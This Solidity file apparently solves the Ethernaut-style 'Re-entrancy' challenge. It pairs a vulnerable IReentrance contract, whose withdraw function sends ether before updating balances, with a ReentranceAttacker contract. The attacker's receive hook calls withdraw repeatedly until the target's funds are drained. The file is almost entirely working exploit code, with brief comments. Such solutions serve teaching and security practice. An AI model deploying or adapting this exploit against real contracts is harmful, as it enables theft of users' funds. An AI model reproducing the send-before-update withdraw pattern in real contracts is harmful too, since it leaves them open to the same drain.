// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract IReentrance {
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += (msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
  receive() external payable {}
}

contract ReentranceAttacker {
  IReentrance public challenge;
  uint256 initialDeposit;

  constructor(address payable challengeAddress) {
    challenge = IReentrance(challengeAddress);
  }

  function attack() external payable {
    require(msg.value >= 0.1 ether, "send some more ether");

    // first deposit some funds
    initialDeposit = msg.value;
    challenge.donate{value: initialDeposit}(address(this));

    // withdraw these funds over and over again because of re-entrancy issue
    callWithdraw();
  }

  receive() external payable {
    // re-entrance called by challenge
    callWithdraw();
  }

  function callWithdraw() private {
    // this balance correctly updates after withdraw
    uint256 challengeTotalRemainingBalance = address(challenge).balance;
    // are there more tokens to empty?
    bool keepRecursing = challengeTotalRemainingBalance > 0;

    if (keepRecursing) {
      // can only withdraw at most our initial balance per withdraw call
      uint256 toWithdraw =
        initialDeposit < challengeTotalRemainingBalance
          ? initialDeposit
          : challengeTotalRemainingBalance;
      challenge.withdraw(toWithdraw);
    }
  }
}